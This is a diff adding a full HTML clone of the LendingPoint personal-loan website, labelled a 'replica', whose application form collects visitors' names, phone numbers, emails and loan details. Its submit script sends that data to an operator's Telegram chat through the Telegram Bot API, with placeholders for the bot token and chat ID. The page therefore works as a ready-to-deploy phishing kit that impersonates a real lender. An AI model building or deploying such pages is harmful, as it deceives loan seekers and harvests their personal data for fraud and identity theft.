@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LendingPoint - Personal Loans Made Easy</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0A192F;
+            --primary-light: #1E293B;
+            --accent: #00B4D8;
+            --accent-hover: #0096C7;
+            --text-dark: #0F172A;
+            --text-muted: #64748B;
+            --bg-light: #F8FAFC;
+            --card-bg: #FFFFFF;
+            --border: #E2E8F0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Top Bar & Header */
+        header {
+            background-color: #FFFFFF;
+            border-bottom: 1px solid var(--border);
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary);
+            text-decoration: none;
+            letter-spacing: -0.5px;
+        }
+
+        .logo span {
+            color: var(--accent);
+        }
+
+        .header-btn {
+            background: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .header-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* Hero Banner */
+        .hero {
+            background: linear-gradient(135deg, #0A192F 0%, #1E293B 100%);
+            color: white;
+            padding: 60px 20px 100px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .hero p {
+            font-size: 1.15rem;
+            color: #94A3B8;
+            max-width: 580px;
+            margin: 0 auto;
+        }
+
+        .badge-pill {
+            display: inline-block;
+            background: rgba(0, 180, 216, 0.15);
+            color: var(--accent);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        /* Main Form Card */
+        .main-container {
+            max-width: 520px;
+            margin: -60px auto 50px;
+            padding: 0 16px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
+            border: 1px solid var(--border);
+        }
+
+        .card-header {
+            margin-bottom: 24px;
+        }
+
+        .card-header h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .card-header p {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="email"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 1rem;
+            color: var(--text-dark);
+            background-color: #F8FAFC;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--accent);
+            background-color: #FFFFFF;
+            box-shadow: 0 0 0 3px rgba(0, 180, 216, 0.15);
+        }
+
+        /* Dynamic Monthly Estimator Box */
+        .estimator-card {
+            background: #F0F9FF;
+            border: 1px solid #BAE6FD;
+            border-radius: 10px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .estimator-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 700;
+            color: #0369A1;
+        }
+
+        .estimator-amount {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin: 4px 0;
+        }
+
+        .estimator-sub {
+            font-size: 0.75rem;
+            color: #0284C7;
+        }
+
+        /* Action Button */
+        .btn-submit {
+            width: 100%;
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            box-shadow: 0 4px 6px -1px rgba(0, 180, 216, 0.3);
+        }
+
+        .btn-submit:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .disclaimer-text {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 14px;
+            line-height: 1.4;
+        }
+
+        /* Status Feedback */
+        #statusMessage {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-align: center;
+            display: none;
+        }
+
+        /* Features Grid */
+        .features {
+            max-width: 900px;
+            margin: 40px auto 60px;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 24px;
+        }
+
+        .feature-card {
+            background: white;
+            padding: 24px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            text-align: left;
+        }
+
+        .feature-icon {
+            width: 42px;
+            height: 42px;
+            background: #E0F2FE;
+            color: var(--accent);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            margin-bottom: 16px;
+        }
+
+        .feature-card h3 {
+            font-size: 1.1rem;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        .feature-card p {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--primary);
+            color: #94A3B8;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            border-top: 1px solid var(--primary-light);
+        }
+
+        footer p {
+            max-width: 700px;
+            margin: 0 auto 10px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navigation Header -->
+    <header>
+        <a href="#" class="logo">Lending<span>Point</span></a>
+        <a href="#" class="header-btn">Sign In</a>
+    </header>
+
+    <!-- Hero Header -->
+    <section class="hero">
+        <div class="badge-pill">Personal Loans $1,000 – $36,500</div>
+        <h1>Your Financial Goals, Our Personal Loans</h1>
+        <p>Get started with a simple application to see your options with no impact to your credit score.</p>
+    </section>
+
+    <!-- Application Form Area -->
+    <div class="main-container">
+        <div class="card">
+            <div class="card-header">
+                <h2>Check Your Loan Options</h2>
+                <p>Complete the quick form below to check instant eligibility.</p>
+            </div>
+
+            <form id="lendingForm">
+                <!-- Loan Amount Input -->
+                <div class="form-group">
+                    <label for="loanAmount">Desired Loan Amount ($)</label>
+                    <input type="number" id="loanAmount" min="1000" max="36500" value="5000" step="100" required oninput="calculatePayment()">
+                </div>
+
+                <!-- Loan Purpose Selection -->
+                <div class="form-group">
+                    <label for="loanPurpose">Loan Purpose</label>
+                    <select id="loanPurpose" required>
+                        <option value="Debt Consolidation / Credit Cards">Debt Consolidation / Credit Cards</option>
+                        <option value="Unexpected Urgent Expense">Unexpected Urgent Expense</option>
+                        <option value="Home Improvement">Home Improvement</option>
+                        <option value="Major Purchase">Major Purchase</option>
+                        <option value="Personal Financial Reasons">Personal Financial Reasons</option>
+                    </select>
+                </div>
+
+                <!-- Dynamic Monthly Payment Box -->
+                <div class="estimator-card">
+                    <div class="estimator-title">Estimated Monthly Payment</div>
+                    <div class="estimator-amount" id="monthlyPayment">$166 / mo</div>
+                    <div class="estimator-sub">Based on estimated 36-month repayment schedule</div>
+                </div>
+
+                <!-- Personal Information -->
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" placeholder="e.g. John Smith" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input type="tel" id="phoneNumber" placeholder="e.g. (555) 000-0000" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="emailAddress">Email Address</label>
+                    <input type="email" id="emailAddress" placeholder="e.g. john@example.com" required>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-submit">Check Your Options</button>
+
+                <p class="disclaimer-text">Checking your options will not affect your credit score. No hidden fees or prepayment penalties.</p>
+
+                <div id="statusMessage"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Value Proposition Features -->
+    <section class="features">
+        <div class="feature-card">
+            <div class="feature-icon">⚡</div>
+            <h3>Check Your Options</h3>
+            <p>Get started with a simple application to see your payment options with no impact to your credit score.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">📋</div>
+            <h3>Finish Application</h3>
+            <p>Select the best loan terms and monthly payment for you and provide details to complete your application.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">💵</div>
+            <h3>Receive Funds</h3>
+            <p>If approved, the funds could be in your account as soon as the next business day.</p>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>Loans from $1,000 to $36,500 with terms from 24 to 72 months. Rates range from 7.99% to 35.99% APR. All loans subject to credit approval and eligibility verification.</p>
+        <p>&copy; LendingPoint Replica. All rights reserved.</p>
+    </footer>
+
+    <!-- Script for Calculation & Telegram Processing -->
+    <script>
+        // Update estimated payment on input
+        function calculatePayment() {
+            const amountInput = document.getElementById('loanAmount').value;
+            const amount = parseFloat(amountInput) || 0;
+            
+            if (amount > 0) {
+                // Approximate monthly calculation over 36 months
+                const monthly = Math.round((amount * 1.18) / 36);
+                document.getElementById('monthlyPayment').innerText = `$${monthly.toLocaleString()} / mo`;
+            } else {
+                document.getElementById('monthlyPayment').innerText = `$0 / mo`;
+            }
+        }
+
+        // Form Submit Handler connecting directly to Telegram API
+        document.getElementById('lendingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Insert your Telegram Bot credentials here
+            const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+            const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+            const amount = document.getElementById('loanAmount').value;
+            const purpose = document.getElementById('loanPurpose').value;
+            const name = document.getElementById('fullName').value;
+            const phone = document.getElementById('phoneNumber').value;
+            const email = document.getElementById('emailAddress').value;
+            const status = document.getElementById('statusMessage');
+
+            // Format Telegram message with markdown
+            const text = `🚨 *New LendingPoint Loan Lead*\n\n` +
+                         `👤 *Name:* ${name}\n` +
+                         `📞 *Phone:* ${phone}\n` +
+                         `📧 *Email:* ${email}\n` +
+                         `💰 *Requested Amount:* $${parseFloat(amount).toLocaleString()}\n` +
+                         `🎯 *Purpose:* ${purpose}`;
+
+            status.style.display = 'block';
+            status.style.backgroundColor = '#E0F2FE';
+            status.style.color = '#0369A1';
+            status.innerText = "Submitting application...";
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    status.style.backgroundColor = '#DCFCE7';
+                    status.style.color = '#15803D';
+                    status.innerText = "Application submitted successfully! Check your Telegram inbox.";
+                    document.getElementById('lendingForm').reset();
+                    calculatePayment();
+                } else {
+                    status.style.backgroundColor = '#FEE2E2';
+                    status.style.color = '#B91C1C';
+                    status.innerText = "Failed to send message. Please double-check your Bot Token & Chat ID.";
+                }
+            })
+            .catch(() => {
+                status.style.backgroundColor = '#FEE2E2';
+                status.style.color = '#B91C1C';
+                status.innerText = "Network error while connecting to Telegram API.";
+            });
+        });
+    </script>
+</body>
+</html>
